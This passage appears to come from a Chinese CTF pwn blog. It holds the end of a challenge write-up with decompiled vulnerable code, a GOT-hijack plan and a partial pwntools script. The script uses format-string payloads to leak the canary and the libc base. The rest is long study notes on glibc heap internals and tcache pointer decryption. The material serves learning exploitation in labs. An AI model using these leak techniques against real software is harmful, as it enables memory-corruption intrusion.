void sub_1801()&#123;  _BYTE *ptr; // [rsp+8h] [rbp-8h]  ptr = malloc(0x10uLL);  puts(&quot;If you don&#x27;t want her to find out what you said, i can keep it a secret for you.&quot;);  sub_1615(ptr, 16LL);  if ( *ptr == 121 || *ptr == 89 )  &#123;    puts(&quot;Ok, i will keep it.&quot;);    free(ptr);    puts(&quot;What do you want to say?&quot;);    sub_1615(ptr, 16LL);    puts(&quot;You said: &quot;);    puts(ptr);  &#125;  else  &#123;    puts(&quot;What do you want to say?&quot;);    sub_1615(ptr, 16LL);    puts(&quot;You said: &quot;);    puts(ptr);    puts(&quot;She doesn&#x27;t care.&quot;);    free(ptr);  &#125;&#125;
可以在堆中写入字符，这里我们就可以输入iloveuiloveu的前8个字符
先调用sub_1801输入iloveuil，在调用sub_1A33输入oveu就可以得到elf基址了
当然这里也不是要求输入iloveuiloveu，因为有一个加密函数，异或加密可以解密，按他的加密逻辑写一个解密函数就可以了
观察到
unsigned __int64 sub_1903()&#123;  __int64 v1; // [rsp+8h] [rbp-18h] BYREF  void *ptr; // [rsp+10h] [rbp-10h]  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  v1 = 0LL;  ptr = malloc(0x10uLL);  if ( byte_40B0 != 1 )  &#123;    puts(&quot;Get out of here!&quot;);  &#125;  else  &#123;    puts(&quot;Welcome to my flower shop.&quot;);    puts(&quot;You could order a flower for your girlfriend.&quot;);    puts(&quot;Do you want to order?&quot;);    sub_1615(ptr, 16LL);    if ( *(_BYTE *)ptr == 121 || *(_BYTE *)ptr == 89 )    &#123;      puts(&quot;Where does she live?&quot;);      sub_1615(&amp;v1, 8LL);      puts(&quot;What flower do you want to order for her?&quot;);      sub_1615(v1, 3LL);      puts(&quot;Welcome back!&quot;);      free(ptr);      byte_40B0 = 0;    &#125;    else    &#123;      puts(&quot;See you next time!&quot;);    &#125;  &#125;  return v3 - __readfsqword(0x28u);&#125;
可以实现任意地址写，虽然只能写3个字节
有了elf地址就有了got地址，又能实现任意写改部分地址，几乎可以肯定可以用got hijack
一开始想改的是__stack_chk_fail，改成leave retn，既可以跳过canary检查，又可以实现栈迁移
受Newstar的calc_queen的影响，rand()后rdi存着libc地址，于是我想尝试相同的做法，但是失败了
直到看见了提示——“远在天边，近在眼前”的“眼前”指的是 – 输出
输出函数中只有puts和printf
突然想起来printf(ptr)威力更强，可以利用格式化字符串漏洞同时泄露canary和栈上的__libc_start_main地址，进而得到libc基址
到了这一刻，就豁然开朗了
开了沙箱，orw解决；溢出字节少，栈迁移解决，exp太长就不展示了，当然这题是要爆破3位数字的，也就是1/4096，没爆破出来也是比较遗憾
p.recvuntil(b&quot;--&gt;&gt;&quot;)p.sendline(str(1))p.recvuntil(b&quot;i can keep it a secret for you.&quot;)p.sendline(decrypt_data(b&quot;y&quot;,1))p.recvuntil(b&quot;What do you want to say?&quot;)payload2=b&quot;%11$p&quot;p.sendline(decrypt_data(payload2,5))p.recvuntil(b&quot;You said: &quot;)p.recvuntil(b&quot;0x&quot;)canary_hex = p.recv(16)canary = int(canary_hex, 16)print(f&quot;提取到的Canary: 0x&#123;canary_hex.decode()&#125;&quot;)# 泄露canaryp.recvuntil(b&quot;--&gt;&gt;&quot;)p.sendline(str(1))p.recvuntil(b&quot;i can keep it a secret for you.&quot;)p.sendline(decrypt_data(b&quot;y&quot;,1))p.recvuntil(b&quot;What do you want to say?&quot;)payload10=b&quot;%33$p&quot;p.sendline(decrypt_data(payload10,5))p.recvuntil(b&quot;You said: &quot;)p.recvuntil(b&quot;0x&quot;)canary_hex = p.recv(12)libc_base = int(canary_hex, 16)-libc.sym[&quot;__libc_start_main&quot;]-0x80print(hex(libc_base))# 泄露libc地址
以上就是对格式化字符串漏洞的一些利用方式。
]]></content>
      <categories>
        <category>Knowledge</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>heap-all-in-one</title>
    <url>/2025/10/30/heap-all-in-one/</url>
    <content><![CDATA[参考文章
https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/
https://www.cnblogs.com/ve1kcon/p/18071091
https://iyheart.github.io/2024/10/11/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86unlink/index.html
https://eastxuelian.nebuu.la/glibc/glibc-simple
https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#21-house-of-spirit
https://zikh26.github.io/posts/501cca6.html
https://zp9080.github.io/post/%E5%A0%86%E6%9D%82%E8%AE%B0/%E9%AB%98%E7%89%88%E6%9C%ACoff-by-null/
https://blog.csdn.net/qq_41683953/article/details/136767925
http://124.220.191.5/2025/09/13/off-by-null/index.html
https://9anux.org/2024/08/06/house%20of%20water%20&amp;%20TFCCTF%202024%20MCGUAVA/
https://zephyr369.online/houseofwater/
https://bbs.kanxue.com/thread-268245.htm
https://enllus1on.github.io/2024/01/22/new-read-write-primitive-in-glibc-2-38/#more%EF%BC%8C%E6%94%B9%E8%BF%9B%E5%90%8E%E5%B0%B1%E4%B8%8D%E9%9C%80%E8%A6%81wide_data%E4%BA%86
https://zp9080.github.io/post/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple1/
https://196082.github.io/2022/08/05/house-of-apple2/
https://www.cnblogs.com/mazhatter/p/18475601
https://blog.csome.cc/p/house-of-some/
https://nicholas-wei.github.io/2022/02/07/tcache-stashing-unlink-attack/
https://xz.aliyun.com/spa/#/news/5139
https://blog.csdn.net/qq_45323960/article/details/123810198?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=io_file&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduweb~default-1-123810198.142^v102^pc_search_result_base8&amp;spm=1018.2226.3001.4187
https://bbs.kanxue.com/thread-272098.htm
https://bbs.kanxue.com/thread-275968.htm
https://www.cameudis.com/2024/04/18/BlackHatMEA2023-House-of-Minho.html
堆的结构和管理
ptmalloc
brk
int brk(const void *addr)
参数为新的堆顶，返回值：成功返回0，否则为-1
sbrk
void* sbrk(intptr_t incr)
参数为堆增加的大小（可以是负数和零），返回新的堆顶的地址
mmap
void *mmap(void *addr, size_z length, int prot,int flags,int fd, off_t offset) 
其中，参数的含义如下： - start：映射区的开始地址，通常设置为NULL，表示由系统确定地址。 - length：映射区的长度。 * prot：映射区的保护权限，可以是PROT_EXEC、PROT_READ、PROT_WRITE、PROT_NONE的组合。 - flags：影响映射区域的各种特性，如MAP_SHARED、MAP_PRIVATE、MAP_FIXED等。 - fd：要映射到内存中的文件描述符，通常由open函数返回。 - offset：文件映射的偏移量，通常设置为0。
成功返回被映射区的指针，失败时返回MAP_FAILED
munmap
int munmap(void *addr, size_t length)
参数start是mmap返回的地址，length是映射区的大小
成功执行时返回0，失败时返回-1
mmap()和brk()/sbrk()这两种不同方式申请的堆内存是互相独立的，各自管理不同的内存区域，使用mmap时并不会自动调整brk指针
chunk
struct malloc_chunk &#123;      INTERNAL_SIZE_T      prev_size;    /* Size of previous chunk (if free).  */      INTERNAL_SIZE_T      size;         /* Size in bytes, including overhead. */          struct malloc_chunk* fd;           /* double links -- used only if free. */      struct malloc_chunk* bk;          /* Only used for large blocks: pointer to next larger size.  */      struct malloc_chunk* fd_nextsize;      /* double links -- used only if free. */      struct malloc_chunk* bk_nextsize;   &#125;;
下面我们来看 chunk 结构体，各个字段的具体的解释如下：

prev_size, 如果该 chunk 的 物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小） 是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。这里的前一 chunk 指的是较低地址的 chunk 
size ，该 chunk 的大小，大小必须是 MALLOC_ALIGNMENT 的整数倍。如果申请的内存大小不是 MALLOC_ALIGNMENT 的整数倍，会被转换满足大小的最小的 MALLOC_ALIGNMENT 的倍数，这通过 request2size() 宏完成。32 位系统中， MALLOC_ALIGNMENT 可能是 4 或 8 ；64 位系统中，MALLOC_ALIGNMENT 是 8

该字段的低三个比特位对 chunk 的大小没有影响，它们从高到低分别表示
NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1表示不属于，0表示属于
IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的，M=1为mmap映射区域分配，M=0为heap区域分配
PREV_INUSE，记录前一个 chunk 块是否被分配

一般来说，堆中第一个被分配的内存块的 size 字段的 P位都会被设置为 1
当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址
p=1时，表示前一个chunk正在使用，prev_size无效


fd，bk。 chunk 处于分配状态时，从 fd 字段开始是用户的数据。 chunk 空闲时，会被添加到对应的空闲管理链表中，其字段的含义如下

fd 指向下一个（非物理相邻）空闲的 chunk 。
bk 指向上一个（非物理相邻）空闲的 chunk 。
通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理。

fd_nextsize， bk_nextsize，也是只有 chunk 空闲的时候才使用，不过其用于较大的 chunk（large chunk）

fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。
一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适 chunk 时挨个遍历。


// 获取用户数据部分的指针  #define chunk2mem(p) ((void*)((char*)(p) + 2 * sizeof(size_t)))    // 从用户数据指针获取chunk指针  #define mem2chunk(mem) ((mchunkptr*)((char*)(mem) - 2 * sizeof(size_t)))    // 获取下一个chunk的指针  #define next_chunk(p) ((mchunkptr*)((char*)(p) + ((p)-&gt;size &amp; ~0x7)))
我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处
top chunk

第一次使用malloc时向系统申请内存放入top chunk中，此时av-&gt;top会指向top chunk的prev_size位，然后从top chunk中切割一块chunk
再次使用malloc时先判断bins中是否有符合要求的空闲堆，没有的话就从top chunk中切割一块，然后更新main_arena的top指针
如果申请的堆块大小大于top chunk大小，top chunk与bins中空闲的chunk合并，并查看合并的top chunk是否满足要求
以上都不满足则通过系统调用申请额外内存，拓展到top chunk中

bins
bin是一个由struct chunk结构体组成的链表，负责管理free chunk #include &lt;stddef.h&gt;    typedef struct malloc_chunk* mchunkptr; typedef struct malloc_chunk *mfastbinptr;// 内存块结构定义  typedef struct malloc_chunk &#123;      size_t prev_size;    // 前一个块的大小      size_t size;         // 当前块的大小      struct malloc_chunk* fd; // 前向指针      struct malloc_chunk* bk; // 后向指针  &#125; mchunkptr;    // 分配器状态结构定义  typedef struct malloc_state &#123;      mchunkptr* fastbinsY[10];  // fast bins数组，简化为10个大小      mchunkptr* unsorted_bin;   // unsorted bin链表头      mchunkptr* smallbins[64];  // small bins数组，简化为64个大小      mchunkptr* largebins[64];  // large bins数组，简化为64个大小      // 其他管理信息  &#125; mstate;    // 初始化malloc_state  void init_malloc_state(mstate* state) &#123;      for (int i = 0; i &lt; 10; ++i) &#123;          state-&gt;fastbinsY[i] = NULL;      &#125;      state-&gt;unsorted_bin = NULL;      for (int i = 0; i &lt; 64; ++i) &#123;          state-&gt;smallbins[i] = NULL;          state-&gt;largebins[i] = NULL;      &#125;  &#125;
fastbin

大小：0x20~0x80（包括头）
个数：10条链
fastbins中chunk的size最后一位始终置1，这是为了防止fastbin中chunk的内存合并，以便快速分配
是单向链表，使用fd连接，添加和移除都是对链表头操作，LIFO（后进先出）
在释放时只会对链表指针头部的chunk进行校验，也就是说连续重复释放同一个chunk才会报错


unsortedbin

大小：无限制
个数：1个链表
当用户释放的内存大于max_fast或者fastbins合并后的chunk都会首先进入unsortedbin上
是双向链表，FIFO（后进先出）

smallbin

大小：小于0x400
个数：62个
双向链表，FIFO
释放small chunk时，先检查该chunk相邻的chunk是否为free，是的话就进行合并操作，合成成新的chunk，并从smallbin中移除，最后将新的chunk添加到unsortedbin中，之后unsortedbin进行整理后再添加到对应bin链上
放入smallbin的条件

符合大小范围
释放堆到unsortedbin，再申请一个不在unsortedbin和smallbin中的堆，这样先前被放入unsortedbin的堆就会被放入smallbin
smallbin被切割后，切割后的堆先被放入unsortedbin中，再申请一个堆，没有使unsortedbin中堆块被切割，那么unsortedbin中的堆就会被放入smallbin





下标
32位
64位




2
16
32


3
24
48


x
8x
16x


63
504
1008




largebin

大小：大于0x400
个数：63个
使用fd_nextsize，bk_nextsize连接
同一个largebin中每个chunk的大小可以不一样
large chunk可以添加、删除在large bin的任何一个位置
同一个largebin中的所有chunk按照大小进行从大到小的排列：最大的chunk放在一个链表的链头，最小的chunk放在链尾；相同大小的chunk按照最近使用顺序排序
对比链表链头chunk的size，如果足够大，就从链尾开始遍历该large bin，找到第一个size相等或接近的chunk进行分配，如果该chunk大于用户请求的size的话，就将该chunk拆分为两个chunk：前者进行分配并且size等同于用户请求的size；剩余的部分做为一个新的chunk添加到unsorted bin中
如果该large bin中最大的chunk的size小于用户请求的size的话，那么就通过binmap找到了下一个非空的large bin的话，按照上一段中的方法分配chunk，无法找到则使用top chunk来分配合适的内存
free操作类似于smallbin




组
数量
公差




1
32
64


2
16
512


3
8
4096


4
4
32768


5
2
262144


6
1
不限制



tcache

类似fastbin，LIFO，头插法
第一次 malloc 时，会先 malloc 一块内存用来存放 tcache_perthread_struct 。
free 内存，且 size 小于 small bin size 时

tcache 之前会放到 fastbin 或者 unsorted bin 中
tcache 后：

先放到对应的 tcache 中，直到被填满（默认是 7 个）
填满之后放到 fastbin 或者 unsorted bin 中
tcache 中的 chunk 不会合并（不取消 inuse bit


malloc 内存，且 size 在 tcache 范围内

先从 tcache 取 chunk，直到 tcache 为空，再从 bin 中找
tcache 为空时，如果 fastbin/smallbin/unsorted bin 中有 size 符合的 chunk，会先把 fastbin/smallbin/unsorted bin 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来


tcache指向的直接是用户地址，而不是之前bin指向的是header的地址
对于tcache，glibc会在第一次申请堆块的时候创建一个tcache_perthread_struct的数据结构，同样存放在堆上 /* 每个线程都有一个这个数据结构，所以他才叫&quot;perthread&quot;。保持一个较小的整体大小是比较重要的。 */  // TCACHE_MAX_BINS的大小默认为64  // 在glibc2.26-glibc2.29中，counts的大小为1个字节，因此tcache_perthread_struct的大小为1*64 + 8*64 = 0x250(with header) typedef struct tcache_entry&#123;  struct tcache_entry *next;&#125; tcache_entry;typedef struct tcache_perthread_struct  &#123;  	char counts[TCACHE_MAX_BINS];  	tcache_entry *entries[TCACHE_MAX_BINS];  &#125; tcache_perthread_struct;   //在glibc2.29及以上版本中加入了key，在2.33及以下是使用tcache_perthread_struct的地址，在2.34及以上是使用随机值，可以使用p/x tcache_key检验，放入tcache中会增添key，取出tcache会置空keytypedef struct tcache_entry&#123;  struct tcache_entry *next;  struct tcache_perthread_struct *key;&#125;tcache_entry;typedef struct tcache_perthread_struct&#123;  char counts[TCACHE_MAX_BINS];    tcache_entry *entries[TCACHE_MAX_BINS]&#125; tcache_perthread_struct;// 在glibc2.30及以上版本中，counts的大小为2个字节，因此tcache_perthread_struct的大小为2*64 + 8*64 = 0x290(with header)typedef struct tcache_entry&#123;  struct tcache_entry *next;  struct tcache_perthread_struct *key;&#125;tcache_entry;typedef struct tcache_perthread_struct&#123;  uint16_t counts[TCACHE_MAX_BINS];    tcache_entry *entries[TCACHE_MAX_BINS]&#125; tcache_perthread_struct;//在2.32版本，ptmalloc引入了PROTECT_PTR，即保护指针的概念，其指针是被异或加密的，如果对系统的堆地址一无所知，将无法正确解读泄露的指针的真实值static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123;  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache_key;  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);&#125;/* Caller must ensure that we know tc_idx is valid and there&#x27;s   available chunks to remove.  Removes chunk from the middle of the   list.  */static __always_inline void *tcache_get_n (size_t tc_idx, tcache_entry **ep)&#123;  tcache_entry *e;  if (ep == &amp;(tcache-&gt;entries[tc_idx]))    e = *ep;  else    e = REVEAL_PTR (*ep);  if (__glibc_unlikely (!aligned_OK (e)))    malloc_printerr (&quot;malloc(): unaligned tcache chunk detected&quot;);  if (ep == &amp;(tcache-&gt;entries[tc_idx]))      *ep = REVEAL_PTR (e-&gt;next);  else    *ep = PROTECT_PTR (ep, REVEAL_PTR (e-&gt;next));  --(tcache-&gt;counts[tc_idx]);  e-&gt;key = 0;  return (void *) e;&#125;

在新的entry被put到tcache的时候，其fd将会与0异或，换言之，没有被加密，利用这一点，可以轻松泄露heap地址 #define PROTECT_PTR(pos, ptr) \  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
how2heap展示的解第二个free的tcache的fd指针 long decrypt(long cipher)&#123;    puts(&quot;The decryption uses the fact that the first 12bit of the plaintext (the fwd pointer) is known,&quot;);    puts(&quot;because of the 12bit sliding.&quot;);    puts(&quot;And the key, the ASLR value, is the same with the leading bits of the plaintext (the fwd pointer)&quot;);    long key = 0;    long plain;    for(int i=1; i&lt;6; i++) &#123;        int bits = 64-12*i;        if(bits &lt; 0) bits = 0;        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits;        key = plain &gt;&gt; 12;        printf(&quot;round %d:\n&quot;, i);        printf(&quot;key:    %#016lx\n&quot;, key);        printf(&quot;plain:  %#016lx\n&quot;, plain);        printf(&quot;cipher: %#016lx\n\n&quot;, cipher);    &#125;    return plain;&#125;
写成python def decrypt(cipher):    key = 0    plain = 0    for i in range(1, 6):        bits = 64 - 12 * i        if bits &lt; 0:            bits = 0        plain = ((cipher ^ key) &gt;&gt; bits) &lt;&lt; bits        key = plain &gt;&gt; 12        #print(f&quot;round &#123;i&#125;:&quot;)        #print(f&quot;key:    0x&#123;key:016x&#125;&quot;)        #print(f&quot;plain:  0x&#123;plain:016x&#125;&quot;)        #print(f&quot;cipher: 0x&#123;cipher:016x&#125;\n&quot;)    return plainif __name__ == &quot;__main__&quot;:    b = 0x55500000c7f9    plaintext = decrypt(b)    print(f&quot;recovered value: 0x&#123;plaintext:016x&#125;&quot;)    #recovered value: 0x00005555555592a0
堆的初始化和管理流程
malloc

第一次调用 malloc申请堆空间：首先会跟着 hook 指针进入 malloc_hook_ini() 函数里面进行对 ptmalloc 的初始化工作，并置空 hook，再调用 ptmalloc_init() 和 __libc_malloc()
再次调用 malloc 申请堆空间：malloc() -&gt; __libc_malloc() -&gt; _int_malloc()
checked_request2size将请求内存大小转换为实际大小
先尝试从fastbins中分配出去(0x80)
再尝试从smallbins中分配出去(0x400)

smallbins还没有初始化则进行malloc_consolidate

若malloc_state的fastbin为空，则对整个malloc_state初始化
malloc_init_state(av)先初始化除fastbin以外的所有的bins初始化，在初始化fastbin


进行malloc_consolidate，将fastbins中的chunk转移到unsortedbin中

没有初始化ptmalloc则初始化ptmalloc
当前chunk的prev_inuse位为0就会进行后向合并
当前chunk的相邻高地址chunk是空闲的则进行前向合并
当前chunk的下一个chunk如果不为top chunk，则将chunk放入unsortedbin头

如果为largebin则将fd_nextsize和bk_nextsize置为NULL

当前chunk的下一个chunk如果为top chunk，则将当前chunk合并入top chunk
遍历完每一条fastbins的bin链

遍历 unsortedbin 中的 chunk

如果 unsortedbin 只有一个chunk，并且这个chunk 在上次分配时被使用过，并且所需分配的 chunk 大小属于 smallbins，且 chunk 的大小大于等于需要分配的大小，这种情况下就直接将该 chunk 进行切割，剩下的部分继续留在 unsortedbin 里
否则会从后往前一直整理这些chunk，根据 chunk 的空间大小将其放入所属 smallbin 链或是 largebin 链中，一直整理直到遇到 chunk_size = nb 的 chunk，或者说整理到 bin 链为空

unsortedbin 链里有多个 chunk 的情况时，chunk 不是直接在 unsortedbin 里面被切割的
如果是只有一个的话就是直接切割


遍历 smallbins 和 largebins，按照 smallest-first，best-fit 原则，找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链入到 unsortedbin 中
尝试从 top chunk 中分配所需 chunk
还没能分配成功的话就到 sbrk, mmap 了

free

检查free_hook是否为空，不为空则执行这个函数指针指向的函数，执行后返回
检查被free的addr是否为0，为零直接返回
修改addr指向chunk头
检查是否由mmap分配，是则单独处理，调用munmap_chunk()释放内存
获取该chunk的arena调用_int_free传入arena_ptr，chunk_addr，0(一个锁)
检查是否能被链入fastbin
进行一系列检查

先获得分配区的锁
free的chunk不能是top chunk
free的chunk是通过sbrk()分配的，且下一个相邻的chunk地址不能超过了top chunk
free的chunk的下一个相邻的chunk的size的标志位要标志当前free chunk处于inuse
free 的chunk的下一个相邻 chunk 的大小，该大小要大于等于 2*SIZE_SZ 并且小于分配区所分配区的内存总量

判断是链入fastbin还是与top_chunk合并
chunk覆盖垃圾数据，将chunk链入fastbin，double free检查等
检查前一个堆是否空闲，空闲的话前向合并
检查后一个堆是否为top chunk，是否空闲，空闲的话后向合并
合并的堆块如果和top chunk相连则直接合并，否则放入unsortedbin中并进行检查
进行malloc_consolidate
进行一系列操作

如果合并后的chunk大小大于0x10000，并且fastbins存在空闲chunk，调用malloc_consolidate
top chunk大小大于heap收缩阈值，则收缩
获得了分配区的锁则对分配区解锁

大块内存单独处理

unlink

使用场景：

malloc

large bin
遍历unsortedbin
从比请求的chunk所在的bin大的bin中取chunk

free

后向合并（合并物理相邻低地址空闲chunk)
前向合并（除了top chunk）

malloc_consolidate

同free

realloc

前向拓展（除了top chunk）




malloc_consolidate

触发点：

_int_malloc_：一个size在smallbin、largebin的chunk正在被分配，或没有适合的bins被寻找重新申请回去并且top chunk太小了不能满足malloc的申请
_int_free：如果这个chunk不小于FASTBIN_CONSOLIDATION_THRESHOLD (65536)
malloc_trim：总是调用
_int_mallnfo
mallopt：总是调用

_int_malloc_(large size)

fastbin中堆与top chunk相邻
fastbin中堆不与top chunk相邻
合并fastbin中物理相邻的堆块（不同大小也可以） ### malloc_state


main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段
struct malloc_state &#123; 	/* Serialize access. */	__libc_lock_define(, mutex);	/* Flags (formerly in max_fast). */ 	int flags; /* Fastbins */ 	mfastbinptr fastbinsY[ NFASTBINS ]; 	/* Base of the topmost chunk -- not otherwise kept in a bin */ 	mchunkptr top; 	/* The remainder from the most recent split of a small request */ 	mchunkptr last_remainder; 	/* Normal bins packed as described above */ 	mchunkptr bins[ NBINS * 2 - 2 ]; 	/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ 	unsigned int binmap[ BINMAPSIZE ]; 	/* Linked list, points to the next arena */ 	struct malloc_state *next; 	/* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ 	struct malloc_state *next_free; 	/* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ 	INTERNAL_SIZE_T attached_threads; 	/* Memory allocated from the system in this arena. */ 	INTERNAL_SIZE_T system_mem; 	INTERNAL_SIZE_T max_system_mem; &#125;;
*heap_info
#define HEAP_MIN_SIZE (32 * 1024) #ifndef HEAP_MAX_SIZE # ifdef DEFAULT_MMAP_THRESHOLD_MAX# define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX) # else # define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */ # endif #endif /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps that are dynamically created for multi-threaded programs. The maximum size must be a power of two, for fast determination of which heap belongs to a chunk. It should be much larger than the mmap threshold, so that requests with a size just below that threshold can be fulfilled without creating too many heaps. */ /***************************************************************************/ /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */ typedef struct _heap_info &#123; 	mstate ar_ptr; /* Arena for this heap. */ 	struct _heap_info *prev; /* Previous heap. */ 	size_t size; /* Current size in bytes. */ 	size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ 	/* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ 	char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; &#125; heap_info;
源代码
__libc_malloc
void *__libc_malloc(size_t bytes)&#123;  //首先检查是否存在内存分配的 hook 函数，如果存在，调用 hook 函数，并返回，hook 函数主要用于进程在创建新线程过程中分配内存，或者支持用户提供的内存分配函数。  mstate ar_ptr;  void *victim;  void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);  if (__builtin_expect(hook != NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS(0));  //获取分配区指针，如果获取分配区失败，返回退出，否则，调用 _int_malloc() 函数分配内存。  arena_get(ar_ptr, bytes);  victim = _int_malloc(ar_ptr, bytes);  /* Retry with another arena only if we were able to find a usable arena     before.  */        //如果 _int_malloc() 函数分配内存失败，就会判断使用的分配区是不是主分配区，然后是一些获取分配区，解锁之类的操作。  if (!victim &amp;&amp; ar_ptr != NULL)  &#123;    LIBC_PROBE(memory_malloc_retry, 1, bytes);    ar_ptr = arena_get_retry(ar_ptr, bytes);    victim = _int_malloc(ar_ptr, bytes);  &#125;  if (ar_ptr != NULL)    (void)mutex_unlock(&amp;ar_ptr-&gt;mutex);  assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||         ar_ptr == arena_for_chunk(mem2chunk(victim)));  return victim;&#125;
__malloc_hook
__malloc_hook 指向 malloc_hook_ini，该函数为 ptmalloc 的初始化函数。主要用于初始化全局状态机和 chunk 的数据结构，首先来看看 malloc_hook_ini 函数 /*** 初始化。*/static void *malloc_hook_ini (size_t sz, const void *caller)&#123;    //先将 malloc_hook 的值设置为 NULL，然后调用 ptmalloc_init 函数，最后又回调了 libc_malloc 函数。    __malloc_hook = NULL;    ptmalloc_init ();    return __libc_malloc (sz);&#125; #### _int_malloc static void *_int_malloc(mstate av, size_t bytes)&#123;  INTERNAL_SIZE_T nb; /* 符合要求的请求大小 */  unsigned int idx;   /* 相关的bin指数 */  mbinptr bin;        /* 相关的bin */  mchunkptr victim;     /* 检查/选择的块 */  INTERNAL_SIZE_T size; /* its size */  int victim_index;     /* its bin index */  mchunkptr remainder;          /* 被分割的剩余部分 */  unsigned long remainder_size; /* its size */  unsigned int block; /* bit map traverser */  unsigned int bit;   /* bit map traverser */  unsigned int map;   /* current word of binmap */  mchunkptr fwd; /* misc temp for linking */  mchunkptr bck; /* misc temp for linking */  const char *errstr = NULL;  /*     Convert request size to internal form by adding SIZE_SZ bytes     overhead plus possibly more to obtain necessary alignment and/or     to obtain a size of at least MINSIZE, the smallest allocatable     size. Also, checked_request2size traps (returning 0) request sizes     that are so large that they wrap around zero when padded and     aligned.   */  checked_request2size(bytes, nb);
/*   If the size qualifies as a fastbin, first check corresponding bin.   This code is safe to execute even if av is not yet initialized, so we   can try it without checking, which saves some time on this fast path. */if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))&#123;  //根据所需 chunk 的大小获得该 chunk 所属 fast bin 的 index。  idx = fastbin_index(nb);      //从链中取出第一个 chunk，并调用 chunk2mem() 函数返回用户所需的内存块。  mfastbinptr *fb = &amp;fastbin(av, idx);  mchunkptr pp = *fb;  do  &#123;    victim = pp;    if (victim == NULL)      break;  &#125; while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);  if (victim != 0)  &#123;    if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0))    &#123;      errstr = &quot;malloc(): memory corruption (fast)&quot;;    errout:      malloc_printerr(check_action, errstr, chunk2mem(victim), av);      return NULL;    &#125;    check_remalloced_chunk(av, victim, nb);    void *p = chunk2mem(victim);    alloc_perturb(p, bytes);    return p;  &#125;&#125;
/*   If a small request, check regular bin.  Since these &quot;smallbins&quot;   hold one size each, no searching within bins is necessary.   (For a large request, we need to wait until unsorted chunks are   processed to find best fit. But for small ones, fits are exact   anyway, so we can check now, which is faster.) */if (in_smallbin_range(nb))&#123;  idx = smallbin_index(nb);      //根据 index 获得某个 small bin 的空闲 chunk 双向循环链表表头,在 if 语句里将最后一个 chunk 赋值给 victim。  bin = bin_at(av, idx);  //如果 victim 与表头相同，表示该链表为空，不能从 small bin 的空闲 chunk 链表中分配。  //下面都是 victim 与表头不相同的情况。  if ((victim = last(bin)) != bin)  &#123;    //如果 victim 为 0，表示所属 small bin 还没有初始化为双向循环链表，调用 malloc_consolidate() 函数将 fast bins 中的 chunk 合并。    if (victim == 0) /* initialization check */      malloc_consolidate(av);    //否则说明有合适的 chunk 在对应的 bin 链，将 victim 从 small bin 的双向循环链表中取出，设置 victim chunk 的 inuse 标志，该标志处于 victim chunk 的下一个相邻 chunk 的 size 字段的第一个 bit。从 small bin 中取出 victim 也可以用 unlink() 宏函数，只是这里没有使用。    else    &#123;      bck = victim-&gt;bk;      //经典的通过检查 victim 的 bck 的 fd 指针是否指向 victim，来确定链表是否有被破坏。      if (__glibc_unlikely(bck-&gt;fd != victim))      &#123;        errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;        goto errout;      &#125;      //脱链。      set_inuse_bit_at_offset(victim, nb);      bin-&gt;bk = bck;      bck-&gt;fd = bin;              